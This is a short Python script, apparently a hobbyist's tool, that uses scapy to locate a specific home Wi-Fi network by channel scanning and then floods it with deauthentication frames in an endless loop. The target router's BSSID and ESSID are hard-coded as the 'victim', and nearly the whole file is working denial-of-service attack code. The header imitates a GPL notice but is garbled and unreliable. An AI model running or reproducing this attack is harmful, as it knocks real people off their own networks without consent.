'''
                     GENERAL PUBLIC LICENSE
                     Version 4, 3 Feb 2024

 Copyright (C) 2024 Free Everyone is permitted to copy and distribute
 verbatim copies of this license document, but changing it is not allowed.

this tool ws made by sofyane bentaleb for fun 
facebook: https://web.facebook.com/sefyan.yalis
isntagram : https://www.instagram.com/s.f.n_term
github : https://github.com/sefyan0hack
linkedin " https://www.linkedin.com/in/kritos-yt-090a22273/

'''

import Class
import time,os
from scapy.all import sniff, Dot11EltDSSSet, Dot11, sendp,srp1

victim = Class.WiFi
# the victim bssid
victim.bssid = "b0:0a:d5:40:cf:3e"
# the victim essid
victim.essid = "inwi Home 4G 40CF3E"
# you're card in monitor mode
card = "wlan1mon"
# time of dos attack befor recheck the channel again 
_T = 60 # second

def channel():
    _channel =-1
    for i in range(1,13):
        os.system(f'iwconfig wlan1mon channel {i}')
        rep = srp1(Class.Packet.ProbeReq(victim),iface=card,verbose=False,retry=0,timeout=1)
        if rep != None:
            _channel = rep[Dot11EltDSSSet].channel
            break
    return _channel

def main():
    while(1):
        victim.channel = channel()
        os.system(f'iwconfig wlan1mon channel {victim.channel}')
        while(victim.channel != -1):
            print(f'attacking victim {victim.essid} at channel {victim.channel}')
            sendp(Class.Packet.deauth(victim),count=_T*1000,iface=card, verbose=False)
            break
if __name__ == "__main__":
    main()
